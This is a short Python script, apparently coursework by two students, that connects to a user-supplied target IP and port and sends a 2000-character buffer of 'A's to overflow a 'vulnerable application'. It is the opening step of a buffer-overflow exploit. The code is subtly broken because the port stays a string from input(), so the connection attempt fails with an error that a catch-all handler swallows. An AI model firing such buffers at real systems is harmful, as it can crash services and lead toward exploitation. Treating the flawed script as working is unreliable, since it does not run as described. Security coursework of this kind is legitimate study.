# Emma Tu, Mindy Yun
# Contributions: Emma - 50%, Mindy - 50%

import socket
import sys

# Target application's IP address and port
TARGET_IP = input("Enter target IP address: ")
TARGET_PORT = input("Enter target port: ") # Target application's port

# Create a large buffer of 'A' characters
buffer = "A" * 2000  

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   # AF_INET designates type of address socket can communicate with
    # socket type constant used in network programming to specify reliable, connection-oriented, two-way byte stream communication

    s.connect((TARGET_IP, TARGET_PORT))
    print(f"Sending buffer of size: {len(buffer)}")
    
    # Send the buffer as input to the vulnerable application
    s.send(bytes(buffer + "\r\n", "latin-1")) 
    
    s.close()
    print("Buffer sent!")

except ConnectionRefusedError:
    print("Connection failed.")
except Exception as e:
    print(f"An error occurred: {e}")



